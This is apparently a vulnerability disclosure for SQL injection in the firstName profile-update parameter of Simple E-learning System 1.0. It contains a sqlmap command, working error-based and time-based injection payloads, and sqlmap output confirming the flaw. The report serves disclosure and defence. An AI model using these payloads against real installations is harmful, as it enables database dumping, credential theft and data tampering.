# SQL Injection in Simple E-learning System

## Overview

* **Vulnerability Type**: SQL Injection (SQLi)
* **Vendor**: SourceCodester
* **Product**: [Simple E-learning System](https://www.sourcecodester.com/php-simple-e-learning-system-source-code)
* **Version**: 1.0
* **Component**: User Profile Update (POST Request)
* **Vulnerable Parameter**: `firstName`

## Description

A SQL Injection (SQLi) vulnerability exists in **Simple E-learning System v1.0**. The vulnerability is located in the user profile update mechanism (e.g., `/james_foreman` or equivalent user profile slug).

The application fails to properly sanitize user input supplied to the `firstName` parameter in a POST request before using it in a SQL query. This allows an authenticated attacker to inject malicious SQL commands, leading to Time-based Blind, Boolean-based Blind, and Error-based SQL Injection. Successful exploitation can result in unauthorized database access, data exfiltration, and potential modification of database integrity.

## Steps to Reproduce

1. **Setup**: Deploy the Simple E-learning System locally.
2. **Login**: Log in to the application using valid credentials (e.g., Email: `jforeman@mail.com`, Password: `jforeman123`).
3. **Capture Request**: Navigate to the user profile update page. Modify the profile and capture the POST request using a proxy tool (like Burp Suite) or browser developer tools to obtain the valid `PHPSESSID` cookie.
4. **Exploit**: Run `sqlmap` against the target URL using the captured cookie and the vulnerable parameter.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8081/james_foreman" --data "firstName=John&lastName=Doe&phoneNumber=0&bio=&profile-updateBtn=Update" --batch -v 6 --risk=3 --cookie "PHPSESSID=YOUR_COOKIE_HERE"

```

## PoC Payload

**Error-Based Payload:**

```sql
firstName=James' AND EXTRACTVALUE(4608,CONCAT(0x5c,0x7176627871,(SELECT (ELT(4608=4608,1))),0x717a707671))-- CVao

```

**Time-Based Blind Payload:**

```sql
firstName=James' AND (SELECT 7179 FROM (SELECT(SLEEP(5)))oHFn)-- CCxI

```

## Proof of Concept

### 1. Automated Analysis with SQLMap

The following output from `sqlmap` confirms that the `firstName` parameter is vulnerable to multiple types of SQL injection:

```text
Parameter: firstName (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: firstName=James' RLIKE (SELECT (CASE WHEN (7580=7580) THEN 0x4a616d6573 ELSE 0x28 END))-- BNFK&lastName=Foreman&phoneNumber=0&bio=Hello, I am James Foreman.&profile-updateBtn=Update

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: firstName=James' AND EXTRACTVALUE(4608,CONCAT(0x5c,0x7176627871,(SELECT (ELT(4608=4608,1))),0x717a707671))-- CVao&lastName=Foreman&phoneNumber=0&bio=Hello, I am James Foreman.&profile-updateBtn=Update

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: firstName=James' AND (SELECT 7179 FROM (SELECT(SLEEP(5)))oHFn)-- CCxI&lastName=Foreman&phoneNumber=0&bio=Hello, I am James Foreman.&profile-updateBtn=Update

---
[INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.33, Apache 2.4.54
back-end DBMS: MySQL >= 5.1 (MariaDB fork)

```

### 2. Execution Evidence

<img width="1154" height="404" alt="图片" src="https://github.com/user-attachments/assets/141a1be5-f568-41cc-9e5b-26d2e8b8ef10" />

## Impact

This vulnerability allows an authenticated attacker to:

1. **Dump the Database**: Retrieve all tables, columns, and data (including other users' credentials) from the database.
2. **Bypass Authentication**: Potentially modify data to escalate privileges.
3. **Data Manipulation**: Modify or delete existing data within the database.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php-simple-e-learning-system-source-code)
